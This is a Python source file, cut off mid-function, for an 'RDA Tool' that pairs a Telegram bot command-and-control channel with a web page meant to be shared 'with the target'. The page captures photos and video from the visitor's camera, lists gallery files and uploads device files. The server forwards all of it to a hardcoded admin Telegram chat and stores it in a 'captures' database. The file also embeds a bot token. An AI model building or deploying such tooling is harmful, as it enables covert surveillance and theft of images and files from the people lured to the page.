#!/usr/bin/env python3
"""
RDA Tool v2.0 — Railway.app Edition
Remote Device Access via Telegram C2 + Browser WebSocket UI
"""

import asyncio
import base64
import json
import logging
import mimetypes
import os
import platform
import re
import secrets
import signal
import sqlite3
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

import aiohttp
from aiohttp import web

# ─── Configuration ───────────────────────────────────────────────────────────

PORT = int(os.environ.get("PORT", 8443))
BOT_TOKEN = "8941952240:AAEcbI6LaKedmcshu4G193341LZGrGZ32ec"
ADMIN_ID = 8610592669
DB_PATH = os.environ.get("RDA_DB_PATH", "rda_data.db")
DATA_DIR = os.environ.get("RDA_DATA_DIR", "rda_captures")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PUBLIC_URL_OVERRIDE = os.environ.get("PUBLIC_URL", "")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("rda")

# ─── Config Container (mutable globals without `global` keyword) ─────────────

class Config:
    def __init__(self):
        self.pub_url = ""
        self.port = PORT
        self.access_tokens: dict = {}
        self.active_conns: dict = {}
        self.bot_offset = 0
        self.aiohttp_session = None

cfg = Config()

# ─── Platform Detection ──────────────────────────────────────────────────────

IS_TERMUX = "com.termux" in (platform.uname().release if hasattr(platform.uname(), 'release') else "")
IS_RAILWAY = bool(os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_SERVICE_NAME"))

# ─── Database ────────────────────────────────────────────────────────────────

def init_db():
    os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        chat_id INTEGER NOT NULL,
        type TEXT NOT NULL,
        filename TEXT,
        data BLOB
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS access_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip TEXT,
        user_agent TEXT,
        token_used TEXT
    )""")
    conn.commit()
    conn.close()

def log_access(ip, ua, token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO access_log (timestamp, ip, user_agent, token_used) VALUES (?, ?, ?, ?)",
              (time.strftime("%Y-%m-%d %H:%M:%S"), ip, ua or "", token or ""))
    conn.commit()
    conn.close()

def save_capture(chat_id, ctype, filename, data):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO captures (timestamp, chat_id, type, filename, data) VALUES (?, ?, ?, ?, ?)",
              (time.strftime("%Y-%m-%d %H:%M:%S"), chat_id, ctype, filename, data))
    conn.commit()
    conn.close()

# ─── Telegram Bot ────────────────────────────────────────────────────────────

async def tg_send(text, chat_id=ADMIN_ID, parse_mode="HTML"):
    if not cfg.aiohttp_session:
        return
    try:
        async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": chat_id, "text": text, "parse_mode": parse_mode
        }) as r:
            return await r.json()
    except Exception as e:
        log.error(f"TG send error: {e}")

async def tg_send_photo(photo_url, caption="", chat_id=ADMIN_ID):
    if not cfg.aiohttp_session:
        return
    try:
        async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/sendPhoto", json={
            "chat_id": chat_id, "photo": photo_url, "caption": caption
        }) as r:
            return await r.json()
    except Exception as e:
        log.error(f"TG photo error: {e}")

async def tg_send_document(file_path, caption="", chat_id=ADMIN_ID):
    if not cfg.aiohttp_session:
        return
    try:
        with open(file_path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("document", f, filename=os.path.basename(file_path))
            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/sendDocument", data=data) as r:
                return await r.json()
    except Exception as e:
        log.error(f"TG doc error: {e}")

async def tg_get_updates():
    if not cfg.aiohttp_session:
        return []
    try:
        async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/getUpdates", json={
            "offset": cfg.bot_offset, "timeout": 30
        }) as r:
            data = await r.json()
            if data.get("ok"):
                for u in data.get("result", []):
                    cfg.bot_offset = u["update_id"] + 1
                return data["result"]
    except Exception as e:
        log.error(f"TG poll error: {e}")
    return []

async def tg_set_webhook(url=None):
    """Set Telegram webhook. If url is None, delete existing webhook."""
    if not cfg.aiohttp_session:
        return False
    try:
        if url:
            webhook_url = f"{url.rstrip('/')}/webhook"
            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/setWebhook", json={
                "url": webhook_url,
                "allowed_updates": ["message", "callback_query"]
            }) as r:
                result = await r.json()
                log.info(f"Webhook set to {webhook_url}: {result}")
                return result.get("ok", False)
        else:
            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/deleteWebhook") as r:
                return (await r.json()).get("ok", False)
    except Exception as e:
        log.error(f"Webhook error: {e}")
        return False

async def handle_tg_command(update):
    """Process an incoming Telegram update."""
    msg = update.get("message") or update.get("callback_query", {}).get("message", {})
    chat_id = msg.get("chat", {}).get("id")
    if not chat_id:
        return

    text = ""
    if "message" in update:
        text = update["message"].get("text", "")
    elif "callback_query" in update:
        text = update["callback_query"].get("data", "")
        # Answer callback query
        cb_id = update["callback_query"]["id"]
        if cfg.aiohttp_session:
            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/answerCallbackQuery", json={
                "callback_query_id": cb_id
            }) as r:
                pass

    if not text:
        return

    parts = text.strip().split()
    cmd = parts[0].lower()

    if cmd == "/start":
        await tg_send(
            "🚀 <b>RDA Tool Active</b>\n\n"
            "Commands:\n"
            "/url — Get the web interface URL\n"
            "/token — Generate a new access token\n"
            "/tokens — List active tokens\n"
            "/revoke &lt;token&gt; — Revoke a token\n"
            "/stats — Show capture statistics\n"
            "/broadcast &lt;msg&gt; — Send notification to all connected clients\n"
            "/help — Show this message",
            chat_id
        )

    elif cmd == "/url":
        url = cfg.pub_url or f"http://0.0.0.0:{cfg.port}"
        await tg_send(f"🔗 <b>Web Interface:</b>\n{url}\n\n<i>Share this URL with the target.</i>", chat_id)

    elif cmd == "/token":
        token = secrets.token_urlsafe(16)
        cfg.access_tokens[token] = {"created": time.time(), "used": 0}
        await tg_send(f"✅ <b>New Token Generated</b>\n<code>{token}</code>\n\nURL: {cfg.pub_url or 'http://0.0.0.0:' + str(cfg.port)}?token={token}", chat_id)

    elif cmd == "/tokens":
        if not cfg.access_tokens:
            await tg_send("No active tokens.", chat_id)
        else:
            lines = ["<b>Active Tokens:</b>"]
            for tok, info in cfg.access_tokens.items():
                created = time.strftime("%H:%M:%S", time.localtime(info["created"]))
                lines.append(f"<code>{tok[:12]}...</code> — used {info['used']}x — created {created}")
            await tg_send("\n".join(lines), chat_id)

    elif cmd == "/revoke" and len(parts) > 1:
        target = parts[1]
        if target in cfg.access_tokens:
            del cfg.access_tokens[target]
            await tg_send(f"✅ Token <code>{target[:12]}...</code> revoked.", chat_id)
        else:
            # Try prefix match
            found = [t for t in cfg.access_tokens if t.startswith(target)]
            if found:
                for t in found:
                    del cfg.access_tokens[t]
                await tg_send(f"✅ Revoked {len(found)} token(s).", chat_id)
            else:
                await tg_send("❌ Token not found.", chat_id)

    elif cmd == "/stats":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*), COUNT(DISTINCT chat_id) FROM captures")
        total, unique = c.fetchone()
        c.execute("SELECT type, COUNT(*) FROM captures GROUP BY type")
        by_type = c.fetchall()
        conn.close()
        lines = [f"📊 <b>Stats:</b>", f"Total captures: {total}", f"Unique devices: {unique}"]
        for t, cnt in by_type:
            lines.append(f"  {t}: {cnt}")
        await tg_send("\n".join(lines), chat_id)

    elif cmd == "/broadcast" and len(parts) > 1:
        broadcast_msg = " ".join(parts[1:])
        count = 0
        for ws in cfg.active_conns.values():
            try:
                await ws.send_json({"type": "notification", "message": broadcast_msg})
                count += 1
            except:
                pass
        await tg_send(f"📢 Broadcast sent to {count} connected client(s).", chat_id)

    elif cmd == "/help":
        await tg_send(
            "Commands:\n"
            "/url — Get the web interface URL\n"
            "/token — Generate a new access token\n"
            "/tokens — List active tokens\n"
            "/revoke &lt;token&gt; — Revoke a token\n"
            "/stats — Show capture statistics\n"
            "/broadcast &lt;msg&gt; — Send notification\n"
            "/help — This message",
            chat_id
        )

async def bot_polling_loop():
    """Background polling for Telegram updates (fallback when no webhook)."""
    while True:
        try:
            updates = await tg_get_updates()
            for update in updates:
                await handle_tg_command(update)
        except Exception as e:
            log.error(f"Bot polling error: {e}")
        await asyncio.sleep(1)

# ─── Public URL Auto-Discovery ──────────────────────────────────────────────

async def discover_public_url():
    """Try multiple methods to find the public URL."""
    # 1. Hardcoded override
    if PUBLIC_URL_OVERRIDE:
        cfg.pub_url = PUBLIC_URL_OVERRIDE.rstrip("/")
        log.info(f"Public URL from env override: {cfg.pub_url}")
        return cfg.pub_url

    # 2. Railway public domain (Railway injects this)
    railway_domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
    if railway_domain:
        cfg.pub_url = f"https://{railway_domain}"
        log.info(f"Public URL from Railway: {cfg.pub_url}")
        return cfg.pub_url

    # 3. Try Cloudflare tunnel metrics endpoint
    await discover_cloudflare_url()
    if cfg.pub_url:
        return cfg.pub_url

    # 4. Try ngrok API
    await discover_ngrok_url()
    if cfg.pub_url:
        return cfg.pub_url

    # 5. Fallback
    cfg.pub_url = f"http://0.0.0.0:{cfg.port}"
    log.warning(f"No public URL detected, using fallback: {cfg.pub_url}")
    return cfg.pub_url

async def discover_cloudflare_url():
    """Try to discover Cloudflare tunnel URL via metrics API / proc / psutil."""
    # Method A: Scan ports 20241-20245 for Cloudflare metrics API
    for port in range(20241, 20246):
        try:
            async with cfg.aiohttp_session.get(f"http://127.0.0.1:{port}/quicktunnel",
                                                 timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status == 200:
                    data = await r.json()
                    if data.get("hostname"):
                        cfg.pub_url = f"https://{data['hostname']}"
                        log.info(f"Cloudflare URL via metrics API port {port}: {cfg.pub_url}")
                        return True
        except:
            pass

    # Method B: Try cloudflared process command line
    try:
        proc = await asyncio.create_subprocess_exec(
            "ps", "aux",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode()
        for line in output.split("\n"):
            if "cloudflared" in line and "tunnel" in line:
                # Try to extract --url or hostname from cmdline
                match = re.search(r'--url\s+(\S+)', line)
                if match:
                    cfg.pub_url = match.group(1).rstrip("/")
                    log.info(f"Cloudflare URL via ps: {cfg.pub_url}")
                    return True
    except:
        pass

    return False

async def discover_ngrok_url():
    """Try ngrok API for public URL."""
    try:
        async with cfg.aiohttp_session.get("http://127.0.0.1:4040/api/tunnels",
                                             timeout=aiohttp.ClientTimeout(total=3)) as r:
            if r.status == 200:
                data = await r.json()
                tunnels = data.get("tunnels", [])
                for tunnel in tunnels:
                    if tunnel.get("public_url") and tunnel.get("config", {}).get("addr", "").endswith(str(cfg.port)):
                        cfg.pub_url = tunnel["public_url"].replace("tcp://", "https://")
                        log.info(f"Ngrok URL: {cfg.pub_url}")
                        return True
    except:
        pass
    return False

async def tunnel_refresh_loop():
    """Periodically try to discover/update the public URL."""
    while True:
        await discover_public_url()
        await asyncio.sleep(10)  # Check every 10 seconds

# ─── Web Server ──────────────────────────────────────────────────────────────

ACCESS_TOKEN_CACHE = {}

def token_required(handler):
    """Decorator to check access token."""
    async def wrapper(request):
        token = request.query.get("token", "")
        if not token or token not in cfg.access_tokens:
            return web.Response(status=403, text="Invalid or missing token", content_type="text/plain")
        cfg.access_tokens[token]["used"] += 1
        ACCESS_TOKEN_CACHE.clear()
        log_access(request.remote, request.headers.get("User-Agent", ""), token)
        return await handler(request)
    return wrapper

async def handle_index(request):
    """Serve the main web page."""
    token = request.query.get("token", "")
    if not token or token not in cfg.access_tokens:
        return web.Response(status=403, text="<h1>Access Denied</h1><p>Valid token required.</p>",
                            content_type="text/html")

    cfg.access_tokens[token]["used"] += 1
    log_access(request.remote, request.headers.get("User-Agent", ""), token)

    # Determine the WebSocket URL — prefer secure WSS
    ws_url = cfg.pub_url or f"http://0.0.0.0:{cfg.port}"
    ws_url = ws_url.replace("https://", "wss://").replace("http://", "ws://")
    ws_url = f"{ws_url}/ws"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RDA Interface</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: #0a0a0f; color: #e0e0e0; min-height: 100vh; }}
.container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
.header {{ text-align: center; padding: 20px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 20px; }}
.header h1 {{ font-size: 1.5em; color: #00d4ff; }}
.status {{ display: flex; justify-content: center; gap: 20px; margin: 15px 0; flex-wrap: wrap; }}
.status-badge {{ padding: 8px 16px; border-radius: 20px; font-size: 0.85em; background: #1a1a2e; }}
.status-badge.online {{ background: #00d4ff22; border: 1px solid #00d4ff; color: #00d4ff; }}
.status-badge.offline {{ background: #ff004422; border: 1px solid #ff0044; color: #ff0044; }}
.card {{ background: #12121a; border-radius: 16px; padding: 24px; margin-bottom: 20px;
        border: 1px solid #1a1a2e; }}
.card h2 {{ font-size: 1.1em; margin-bottom: 15px; color: #00d4ff; }}
.btn-group {{ display: flex; gap: 12px; flex-wrap: wrap; }}
.btn {{ padding: 12px 24px; border: none; border-radius: 12px; font-size: 1em; cursor: pointer;
        transition: all 0.3s; font-weight: 600; }}
.btn-primary {{ background: linear-gradient(135deg, #00d4ff, #0077ff); color: #000; }}
.btn-primary:hover {{ transform: translateY(-2px); box-shadow: 0 8px 25px #00d4ff44; }}
.btn-secondary {{ background: #1a1a2e; color: #e0e0e0; border: 1px solid #2a2a3e; }}
.btn-secondary:hover {{ background: #2a2a3e; }}
.btn-danger {{ background: #ff0044; color: #fff; }}
.btn-danger:hover {{ transform: translateY(-2px); box-shadow: 0 8px 25px #ff004444; }}
.preview {{ margin-top: 20px; text-align: center; }}
.preview img, .preview video {{ max-width: 100%; max-height: 400px; border-radius: 12px;
                                border: 2px solid #1a1a2e; background: #000; }}
.preview-placeholder {{ padding: 40px; color: #555; text-align: center; border: 2px dashed #1a1a2e;
                       border-radius: 12px; }}
.gallery {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
           gap: 10px; margin-top: 15px; max-height: 300px; overflow-y: auto; }}
.gallery-item {{ position: relative; aspect-ratio: 1; border-radius: 8px; overflow: hidden;
                border: 1px solid #1a1a2e; cursor: pointer; }}
.gallery-item img {{ width: 100%; height: 100%; object-fit: cover; }}
.gallery-item .time {{ position: absolute; bottom: 0; left: 0; right: 0;
                       background: #000000aa; font-size: 0.7em; padding: 2px 6px; }}
.toast {{ position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
          background: #00d4ff; color: #000; padding: 12px 24px; border-radius: 12px;
          font-weight: 600; opacity: 0; transition: opacity 0.3s; z-index: 999; }}
.toast.show {{ opacity: 1; }}
.toast.error {{ background: #ff0044; color: #fff; }}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>🔗 RDA Terminal</h1>
    <div class="status">
      <span class="status-badge online" id="statusWs">WebSocket: Disconnected</span>
      <span class="status-badge" id="statusCam">Camera: Idle</span>
    </div>
  </div>

  <div class="card">
    <h2>📸 Camera Capture</h2>
    <div class="btn-group">
      <button class="btn btn-primary" id="captureBtn" onclick="capturePhoto()">Capture Photo</button>
      <button class="btn btn-secondary" id="startVideoBtn" onclick="startRecording()" style="display:none">Start Recording</button>
      <button class="btn btn-danger" id="stopVideoBtn" onclick="stopRecording()" style="display:none">Stop Recording</button>
      <button class="btn btn-secondary" onclick="switchCamera()">🔄 Switch Camera</button>
    </div>
    <div class="preview" id="cameraPreview">
      <video id="videoElement" autoplay playsinline muted style="display:none;width:100%;max-height:350px;border-radius:12px;"></video>
      <canvas id="canvasElement" style="display:none;"></canvas>
      <div class="preview-placeholder" id="cameraPlaceholder">Camera inactive — press "Capture Photo" to activate</div>
    </div>
  </div>

  <div class="card">
    <h2>🖼️ Gallery Access</h2>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="accessGallery()">📂 Open Gallery</button>
      <button class="btn btn-secondary" id="uploadBtn" onclick="document.getElementById('fileInput').click()">📤 Upload File</button>
    </div>
    <input type="file" id="fileInput" multiple style="display:none" onchange="uploadFiles(this.files)">
    <div id="galleryContainer" class="gallery" style="display:none;"></div>
  </div>

  <div class="card">
    <h2>⚙️ Actions</h2>
    <div class="btn-group">
      <button class="btn btn-secondary" onclick="sendToBot('screenshot')">🖥️ Screenshot</button>
      <button class="btn btn-secondary" onclick="sendToBot('clipboard')">📋 Clipboard</button>
      <button class="btn btn-secondary" onclick="sendToBot('location')">📍 Location</button>
      <button class="btn btn-secondary" onclick="sendToBot('devices')">🔌 Connected Devices</button>
      <button class="btn btn-secondary" onclick="sendToBot('network')">🌐 Network Info</button>
      <button class="btn btn-secondary" onclick="sendToBot('battery')">🔋 Battery</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
// ─── WebSocket with Exponential Backoff ──────────────────────────────
let ws = null;
let wsReconnectAttempt = 0;
const WS_MAX_RETRIES = 50;
const WS_BASE_DELAY = 1000;
const WS_MAX_DELAY = 30000;

function getWsUrl() {{
    const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    return `${{proto}}//${{window.location.host}}/ws`;
}}

function connectWebSocket() {{
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;

    const url = getWsUrl();
    ws = new WebSocket(url);

    ws.onopen = function() {{
        wsReconnectAttempt = 0;
        document.getElementById('statusWs').textContent = '🟢 WebSocket: Connected';
        document.getElementById('statusWs').className = 'status-badge online';
        showToast('WebSocket connected');
    }};

    ws.onclose = function() {{
        document.getElementById('statusWs').textContent = '🔴 WebSocket: Disconnected';
        document.getElementById('statusWs').className = 'status-badge offline';
        if (wsReconnectAttempt < WS_MAX_RETRIES) {{
            wsReconnectAttempt++;
            const delay = Math.min(WS_BASE_DELAY * Math.pow(2, wsReconnectAttempt) + Math.random() * 1000, WS_MAX_DELAY);
            setTimeout(connectWebSocket, delay);
        }}
    }};

    ws.onerror = function(e) {{
        console.error('WebSocket error:', e);
    }};

    ws.onmessage = function(event) {{
        try {{
            const data = JSON.parse(event.data);
            handleWsMessage(data);
        }} catch(e) {{
            console.error('WS message error:', e);
        }}
    }};
}}

function handleWsMessage(data) {{
    switch(data.type) {{
        case 'notification':
            showToast('📢 ' + data.message);
            break;
        case 'capture_result':
            if (data.success) {{
                showToast('✅ Capture sent to Telegram');
            }} else {{
                showToast('❌ Capture failed: ' + (data.error || 'unknown error'), true);
            }}
            break;
        case 'gallery':
            renderGallery(data.files);
            break;
        case 'data_response':
            showToast('📨 Data: ' + JSON.stringify(data.payload));
            break;
    }}
}}

function sendWsMessage(msg) {{
    if (ws && ws.readyState === WebSocket.OPEN) {{
        ws.send(JSON.stringify(msg));
        return true;
    }}
    showToast('⚠️ WebSocket not connected', true);
    return false;
}}

// ─── Camera ──────────────────────────────────────────────────────────
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let currentFacingMode = 'environment';

async function getCamera() {{
    try {{
        if (mediaStream) {{
            mediaStream.getTracks().forEach(t => t.stop());
        }}
        mediaStream = await navigator.mediaDevices.getUserMedia({{
            video: {{ facingMode: currentFacingMode, width: {{ ideal: 1920 }}, height: {{ ideal: 1080 }} }},
            audio: false
        }});
        const video = document.getElementById('videoElement');
        video.srcObject = mediaStream;
        video.style.display = 'block';
        document.getElementById('cameraPlaceholder').style.display = 'none';
        document.getElementById('statusCam').textContent = '📷 Camera: Active';
        document.getElementById('statusCam').className = 'status-badge online';
        return true;
    }} catch(e) {{
        showToast('❌ Camera access denied: ' + e.message, true);
        return false;
    }}
}}

async function capturePhoto() {{
    if (!await getCamera()) return;
    await new Promise(r => setTimeout(r, 500));
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob(function(blob) {{
        const reader = new FileReader();
        reader.onload = function() {{
            const base64 = reader.result.split(',')[1];
            sendWsMessage({{
                type: 'capture',
                subtype: 'photo',
                data: base64,
                format: 'png'
            }});
            // Show preview
            const img = document.createElement('img');
            img.src = reader.result;
            const prev = document.getElementById('cameraPreview');
            prev.innerHTML = '';
            prev.appendChild(img);
        }};
        reader.readAsDataURL(blob);
    }}, 'image/png', 0.92);
}}

async function switchCamera() {{
    currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
    await getCamera();
    showToast('🔄 Switched to ' + (currentFacingMode === 'user' ? 'front' : 'back') + ' camera');
}}

function startRecording() {{
    if (!mediaStream) {{
        showToast('❌ Camera not active', true);
        return;
    }}
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(mediaStream, {{ mimeType: 'video/webm' }});
    mediaRecorder.ondataavailable = function(e) {{
        if (e.data.size > 0) recordedChunks.push(e.data);
    }};
    mediaRecorder.onstop = function() {{
        const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
        const reader = new FileReader();
        reader.onload = function() {{
            sendWsMessage({{
                type: 'capture',
                subtype: 'video',
                data: reader.result.split(',')[1],
                format: 'webm'
            }});
        }};
        reader.readAsDataURL(blob);
        document.getElementById('startVideoBtn').style.display = 'inline-block';
        document.getElementById('stopVideoBtn').style.display = 'none';
    }};
    mediaRecorder.start();
    document.getElementById('startVideoBtn').style.display = 'none';
    document.getElementById('stopVideoBtn').style.display = 'inline-block';
    showToast('⏺️ Recording started');
}}

function stopRecording() {{
    if (mediaRecorder && mediaRecorder.state === 'recording') {{
        mediaRecorder.stop();
        if (mediaStream) {{
            mediaStream.getTracks().forEach(t => t.stop());
            mediaStream = null;
        }}
        document.getElementById('videoElement').style.display = 'none';
        document.getElementById('cameraPlaceholder').style.display = 'block';
        showToast('⏹️ Recording stopped, sending...');
    }}
}}

// ─── Gallery ─────────────────────────────────────────────────────────
async function accessGallery() {{
    try {{
        // Try File System Access API first
        if ('showDirectoryPicker' in window) {{
            const dirHandle = await window.showDirectoryPicker();
            const files = [];
            for await (const entry of dirHandle.values()) {{
                if (entry.kind === 'file' && /\.(jpg|jpeg|png|gif|webp|mp4|mov|avi)$/i.test(entry.name)) {{
                    files.push(entry.name);
                }}
            }}
            sendWsMessage({{
                type: 'gallery_request',
                files: files
            }});
            showToast('📂 Gallery opened: ' + files.length + ' files found');
        }} else {{
            // Fallback: use file input
            document.getElementById('fileInput').click();
        }}
    }} catch(e) {{
        if (e.name !== 'AbortError') {{
            showToast('❌ Gallery access error: ' + e.message, true);
        }}
    }}
}}

function renderGallery(files) {{
    const container = document.getElementById('galleryContainer');
    container.style.display = 'grid';
    container.innerHTML = '';
    if (!files || files.length === 0) {{
        container.innerHTML = '<div style="color:#555;text-align:center;padding:20px;">No files found</div>';
        return;
    }}
    files.forEach(function(file) {{
        const div = document.createElement('div');
        div.className = 'gallery-item';
        const img = document.createElement('img');
        const ext = file.name.split('.').pop().toLowerCase();
        if (['jpg','jpeg','png','gif','webp'].includes(ext)) {{
            img.src = '/thumbnail/' + encodeURIComponent(file.path || file.name) + '?token={token}';
            img.onerror = function() {{ img.src = ''; }};
        }}
        div.appendChild(img);
        const time = document.createElement('div');
        time.className = 'time';
        time.textContent = file.name.substring(0, 20);
        div.appendChild(time);
        div.onclick = function() {{ sendWsMessage({{ type: 'open_file', path: file.path || file.name }}); }};
        container.appendChild(div);
    }});
}}

function uploadFiles(files) {{
    Array.from(files).forEach(function(file) {{
        const reader = new FileReader();
        reader.onload = function() {{
            sendWsMessage({{
                type: 'upload',
                name: file.name,
                data: reader.result.split(',')[1],
                mime: file.type
            }});
        }};
        reader.readAsDataURL(file);
    }});
    showToast('📤 Uploading ' + files.length + ' file(s)...');
}}

// ─── Utilities ───────────────────────────────────────────────────────
function showToast(msg, isError) {{
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast' + (isError ? ' error' : '');
    setTimeout(function() {{ toast.classList.add('show'); }}, 10);
    setTimeout(function() {{ toast.classList.remove('show'); }}, 3000);
}}

function sendToBot(action) {{
    sendWsMessage({{ type: 'action', action: action }});
    showToast('📨 Requesting: ' + action);
}}

// ─── Init ────────────────────────────────────────────────────────────
connectWebSocket();

// Heartbeat ping every 20 seconds (within Railway's 15-min limit)
setInterval(function() {{
    if (ws && ws.readyState === WebSocket.OPEN) {{
        ws.send(JSON.stringify({{ type: 'ping' }}));
    }}
}}, 20000);

// Reconnect on visibility change (page becomes visible again)
document.addEventListener('visibilitychange', function() {{
    if (!document.hidden) {{
        connectWebSocket();
    }}
}});
</script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

async def handle_ws(request):
    """WebSocket handler for browser communication."""
    ws = web.WebSocketResponse(heartbeat=15.0)
    await ws.prepare(request)

    # Generate a connection ID
    conn_id = secrets.token_hex(8)
    cfg.active_conns[conn_id] = ws
    log.info(f"WS client connected: {conn_id}")

    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    await process_ws_message(conn_id, data)
                except json.JSONDecodeError:
                    pass
            elif msg.type == aiohttp.WSMsgType.ERROR:
                log.error(f"WS error {conn_id}: {ws.exception()}")
                break
    except asyncio.CancelledError:
        pass
    finally:
        cfg.active_conns.pop(conn_id, None)
        log.info(f"WS client disconnected: {conn_id}")

    return ws

async def process_ws_message(conn_id, data):
    """Process incoming WebSocket message from browser."""
    msg_type = data.get("type", "")

    if msg_type == "ping":
        # Just keepalive, response not needed
        return

    elif msg_type == "capture":
        subtype = data.get("subtype", "photo")
        raw_data = data.get("data", "")
        fmt = data.get("format", "png")

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data)
                filename = f"{subtype}_{int(time.time())}.{fmt}"
                filepath = os.path.join(DATA_DIR, filename)
                os.makedirs(DATA_DIR, exist_ok=True)
                with open(filepath, "wb") as f:
                    f.write(decoded)
                save_capture(ADMIN_ID, subtype, filename, decoded)

                # Send to Telegram
                if subtype == "photo":
                    # Upload photo via multipart
                    if cfg.aiohttp_session:
                        with open(filepath, "rb") as f:
                            form = aiohttp.FormData()
                            form.add_field("chat_id", str(ADMIN_ID))
                            form.add_field("photo", f, filename=filename)
                            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/sendPhoto", data=form) as r:
                                pass
                else:
                    await tg_send_document(filepath, f"📹 {subtype} capture", ADMIN_ID)

                # Notify browser
                ws = cfg.active_conns.get(conn_id)
                if ws:
                    await ws.send_json({"type": "capture_result", "success": True, "filename": filename})
            except Exception as e:
                log.error(f"Capture processing error: {e}")
                ws = cfg.active_conns.get(conn_id)
                if ws:
                    await ws.send_json({"type": "capture_result", "success": False, "error": str(e)})

    elif msg_type == "action":
        action = data.get("action", "")
        await tg_send(f"📱 <b>Action requested:</b> {action}\n\n<code>Target device requested {action} via browser.</code>", ADMIN_ID)
        ws = cfg.active_conns.get(conn_id)
        if ws:
            await ws.send_json({"type": "data_response", "payload": {"action": action, "status": "requested"}})

    elif msg_type == "gallery_request":
        files = data.get("files", [])
        if files:
            msg = f"📂 <b>Gallery access</b>\nFound {len(files)} files on device."
            await tg_send(msg, ADMIN_ID)
        ws = cfg.active_conns.get(conn_id)
        if ws:
            await ws.send_json({"type": "data_response", "payload": {"gallery": files}})

    elif msg_type == "upload":
        name = data.get("name", "unknown")
        raw_data = data.get("data", "")
        mime = data.get("mime", "application/octet-stream")
        if raw_data:
            try:
                decoded = base64.b64decode(raw_data)
                filepath = os.path.join(DATA_DIR, f"upload_{int(time.time())}_{name}")
                os.makedirs(DATA_DIR, exist_ok=True)
                with open(filepath, "wb") as f:
                    f.write(decoded)
                save_capture(ADMIN_ID, "upload", name, decoded)
                await tg_send_document(filepath, f"📤 Upload: {name}", ADMIN_ID)
            except Exception as e:
                log.error(f"Upload error: {e}")

async def handle_webhook(request):
    """Telegram webhook handler."""
    try:
        update = await request.json()
        asyncio.create_task(handle_tg_command(update))
        return web.Response(text="ok")
    except Exception as e:
        log.error(f"Webhook handler error: {e}")
        return web.Response(text="error", status=500)

# ─── Main ────────────────────────────────────────────────────────────────────

async def on_startup(app):
    """Initialize services on app startup."""
    global cfg
    cfg.aiohttp_session = aiohttp.ClientSession()

    # Init database
    init_db()

    # Discover public URL
    await discover_public_url()

    # Set Telegram webhook if we have a public URL
    if cfg.pub_url and "0.0.0.0" not in cfg.pub_url:
        webhook_set = await tg_set_webhook(cfg.pub_url)
        if webhook_set:
            log.info(f"Telegram webhook set to {cfg.pub_url}/webhook")
        else:
            log.warning("Webhook setup failed, starting polling fallback")
            asyncio.create_task(bot_polling_loop())
    else:
        log.info("No public URL, starting polling mode")
        asyncio.create_task(bot_polling_loop())

    # Start tunnel refresh
    asyncio.create_task(tunnel_refresh_loop())

    # Notify admin
    await tg_send(f"🤖 <b>RDA Tool Started</b>\n📡 URL: {cfg.pub_url or 'Not detected (polling)'}\n🔌 Port: {cfg.port}")

    log.info(f"RDA Tool started on port {cfg.port}")
    log.info(f"Public URL: {cfg.pub_url or 'Not yet detected'}")

async def on_shutdown(app):
    """Cleanup on shutdown."""
    if cfg.aiohttp_session:
